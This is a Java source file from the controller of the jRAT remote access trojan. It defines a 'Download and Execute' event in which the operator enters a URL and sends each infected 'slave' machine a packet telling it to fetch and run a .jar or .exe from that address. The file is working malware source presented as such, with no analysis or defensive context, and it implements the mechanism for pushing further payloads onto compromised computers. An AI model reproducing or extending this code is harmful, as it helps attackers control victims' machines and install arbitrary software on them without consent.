package se.jrat.controller.events;

import javax.swing.ImageIcon;
import javax.swing.JOptionPane;

import se.jrat.controller.AbstractSlave;
import se.jrat.controller.Slave;
import se.jrat.controller.packets.outgoing.Packet17DownloadExecute;
import se.jrat.controller.utils.IconUtils;
import se.jrat.controller.utils.NetUtils;
import se.jrat.controller.utils.Utils;


public class DownloadAndExecEvent extends Event {

	public ImageIcon icon = IconUtils.getIcon(getIcon());
	public String url;
	public boolean jar;

	public DownloadAndExecEvent(String name) {
		super(name);
	}

	public Object[] getDisplayData() {
		return new Object[] { icon, super.name, toString(), url, jar ? ".jar" : ".exe" };
	}

	public void perform(AbstractSlave slave) {
		if (slave instanceof Slave) {
			((Slave)slave).addToSendQueue(new Packet17DownloadExecute(url, jar ? ".jar" : ".exe"));
		}
	}

	public String toString() {
		return "Download and Execute";
	}

	public boolean add() {
		String result = Utils.showDialog("Download URL", "Input URL to download and execute");
		if (result == null) {
			return false;
		}
		if (!NetUtils.isURL(result)) {
			JOptionPane.showMessageDialog(null, "Input valid URL!", "Download URL", JOptionPane.ERROR_MESSAGE);
			return false;
		}
		jar = result.trim().endsWith(".jar");
		url = result.trim().replace(" ", "%20");
		return true;
	}

	public String getIcon() {
		return "arrow-down";
	}

}
